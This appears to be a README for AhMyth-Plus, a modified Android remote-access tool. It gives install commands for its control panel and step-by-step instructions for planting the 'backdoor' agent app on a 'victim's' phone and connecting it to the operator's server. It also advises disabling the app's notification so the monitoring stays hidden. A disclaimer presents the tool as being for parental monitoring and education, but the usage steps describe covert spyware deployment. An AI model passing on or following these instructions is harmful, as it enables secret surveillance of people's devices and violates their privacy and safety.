## Important (Read it carefully)
I have published this modified version of official Ahmyth solely for parental purposes, enabling parents to monitor their children's activities and also for educational purposes. I sincerely urge users not to utilize this mod version of AhMyth for any harmful or spying activities, as it is not only illegal and unethical but also religiously forbidden (haram). The responsibility for the usage of this project rests entirely with the user. Please ensure its use for good purposes only, such as monitoring children's activities, tracking criminals and learning purposes.

## Notice
 - Due to the background limitation of Android 8 or higher, the started service has been removed and the foreground service has been added. So you have to turn off the application's notification from the settings.
 - Generate the payload from source code by using Android Studio to get the latest uptdated version of the payload.

## Getting Started

#### Prerequisites
- Node JS environment and npm to run the control panel. So first download Node JS and install it.

#### Installation
 - `git clone https://github.com/VenomDino/AhMyth-Plus.git`
 - `cd AhMyth-Plus/Control-Panel`
 - `npm install electron-builder`
 - `npm install wav`
 - `npm install -g node-gyp`
 - `npm install speaker`
 - `npm start`
  
#### Usage
- First download the agent app (backdoor) from [release page](https://as.co) or you can generate the agent apk from the source using Android Studio.
- Install the backdoor (agent app) on the victim's android device.
- Open the installed backdoor (agent app) and provide your control panel's (AhMyth Server) address and port number and click on "Save & Continue" button.

#### Recommendations
